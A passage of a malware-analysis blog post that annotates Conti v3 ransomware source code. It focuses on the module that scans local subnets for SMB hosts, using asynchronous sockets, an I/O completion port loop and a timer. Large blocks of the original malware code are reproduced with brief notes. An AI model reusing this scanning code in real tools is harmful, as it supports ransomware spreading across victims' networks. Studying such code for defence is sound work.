(BYTE i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		bAddres[<span class="number">3</span>] = i;</span><br><span class="line">		RtlCopyMemory(&amp;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, <span class="keyword">sizeof</span>(CONNECT_CONTEXT));</span><br><span class="line">		<span class="keyword">if</span> (!ConnectCtx) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ConnectCtx-&gt;dwAddres = dwAddress;</span><br><span class="line">		ConnectCtx-&gt;State = NOT_CONNECTED;</span><br><span class="line">		ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, WSA_FLAG_OVERLAPPED);</span><br><span class="line">		<span class="keyword">if</span> (ConnectCtx-&gt;s == INVALID_SOCKET) &#123;</span><br><span class="line"></span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, <span class="keyword">sizeof</span>(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = <span class="number">0</span>;</span><br><span class="line">		SockAddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, <span class="keyword">sizeof</span>(SockAddr)) != ERROR_SUCCESS) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries);</span><br><span class="line">	<span class="built_in">free</span>(SubnetInfo);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ScanHosts"><a href="#ScanHosts" class="headerlink" title="ScanHosts"></a>ScanHosts</h3><ul>
<li><p>ConnectEx</p>
<ul>
<li><p>The <strong>ConnectEx</strong> function establishes a connection to a specified socket, and optionally sends data once the connection is established. The <strong>ConnectEx</strong> function is only supported on connection-oriented sockets.</p>
<ul>
<li><p>&#96;&#96;&#96;<br>  LPFN_CONNECTEX LpfnConnectex;</p>
<p>  BOOL LpfnConnectex(<br>[in]           SOCKET s,<br>[in]           const sockaddr *name,<br>[in]           int namelen,<br>[in, optional] PVOID lpSendBuffer,<br>[in]           DWORD dwSendDataLength,<br>[out]          LPDWORD lpdwBytesSent,<br>[in]           LPOVERLAPPED lpOverlapped<br>  )<br>  {…}</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">VOID</span><br><span class="line">ScanHosts()</span><br><span class="line">&#123;</span><br><span class="line">	PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">	TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesSent;</span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = htons(SMB_PORT);</span><br><span class="line">		SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres;</span><br><span class="line"></span><br><span class="line">		if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) &#123;</span><br><span class="line"></span><br><span class="line">			ConnectCtx-&gt;State = CONNECTED;</span><br><span class="line">			AddHost(ConnectCtx-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else if (WSA_IO_PENDING == WSAGetLastError()) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations++;</span><br><span class="line">			ConnectCtx-&gt;State = CONNECTING;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="AddHost"><a href="#AddHost" class="headerlink" title="AddHost"></a>AddHost</h3><ul>
<li>add the new-found host to the Host table</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">AddHost</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in DWORD dwAddres</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_HostEntry) &#123;</span><br><span class="line">		INT i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (g_HostEntry-&gt;h_addr_list[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++];</span><br><span class="line">			<span class="keyword">if</span> (dwCurrentAddr == dwAddres) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(<span class="keyword">sizeof</span>(HOST_INFO));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HostInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwAddress = INET_ADDRSTRLEN;</span><br><span class="line">	SOCKADDR_IN temp;</span><br><span class="line">	temp.sin_addr.s_addr = dwAddres;</span><br><span class="line">	temp.sin_port = <span class="number">0</span>;</span><br><span class="line">	temp.sin_family = AF_INET;</span><br><span class="line">	HostInfo-&gt;dwAddres = dwAddres;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwAddres != STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, <span class="keyword">sizeof</span>(temp), <span class="literal">NULL</span>, HostInfo-&gt;wszAddress, &amp;dwAddres)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(HostInfo);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pEnterCriticalSection(&amp;g_CriticalSection); &#123;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PortScanHandler"><a href="#PortScanHandler" class="headerlink" title="PortScanHandler"></a>PortScanHandler</h3><p>this handler use the <code>CompletionStatus,IsTimerActivated,g_ActiveOperations</code> to control the code flow.</p>
<ul>
<li>g_ActiveOperations<ul>
<li>use to count the Socket.</li>
<li><code>ScanHosts</code> function: when one host is found ,the value is add by one</li>
<li>if <code>CompletionStatus == CONNECT_COMPLETION_KEY</code>, the value sub by one.</li>
</ul>
</li>
<li>IsTimerActivated<ul>
<li>used to check after the timer.<ul>
<li>IsTimerActivated is True,</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>four scenes</p>
<ol>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success</p>
<ol>
<li><p>if g_ActiveOperations is zero ,then scanHost again</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<pre><code> if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;
 
     ConnectContext-&gt;State = CONNECTED;
     AddHost(ConnectContext-&gt;dwAddres);
 
 &#125;
</code></pre>
</li>
</ol>
</li>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail</p>
<ol>
<li>the same as before</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">			ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>CompletionStatus &#x3D;&#x3D; TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					if (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>CompletionStatus == TIMER_COMPLETION_KEY and  g_ActiveOperations == 0</code> , the socket is out-of-time.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">				pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">				pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">				TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">				pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>CompletionStatus </p>
<ul>
<li>A pointer to a variable that receives the completion key value associated with the file handle whose I&#x2F;O operation has completed. A completion key is a per-file key that is specified in a call to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/FileIO/createiocompletionport">CreateIoCompletionPort</a>.<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
</ul>
</li>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">PortScanHandler</span><span class="params">(PVOID pArg)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	HANDLE hTimer = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hTimerQueue = pCreateTimerQueue();</span><br><span class="line">	<span class="keyword">if</span> (!hTimerQueue) &#123;</span><br><span class="line">		pExitThread(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesTransferred;</span><br><span class="line">		ULONG_PTR CompletionStatus;</span><br><span class="line">		PCONNECT_CONTEXT ConnectContext;</span><br><span class="line"></span><br><span class="line">		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CompletionStatus == START_COMPLETION_KEY) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == CONNECT_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations--;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = CONNECTED;</span><br><span class="line">				AddHost(ConnectContext-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDeleteTimerQueue(hTimerQueue);</span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/_fs/">MSDN</a></p>
<p><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware-Conti-v3/" title="Ransomeware,Conti v3">Ransomeware,Conti v3 </a><span class="leancloud_visitors"></span><span>About 3582 words, 11 min 56 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/13/Pandora-Ransomeware-fla-unpack/">Pandora-Ransomeware-fla-unpack</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Pandora-Ransomware"><a href="#Pandora-Ransomware" class="headerlink" title="Pandora Ransomware"></a>Pandora Ransomware</h1><p>[TOC]</p>
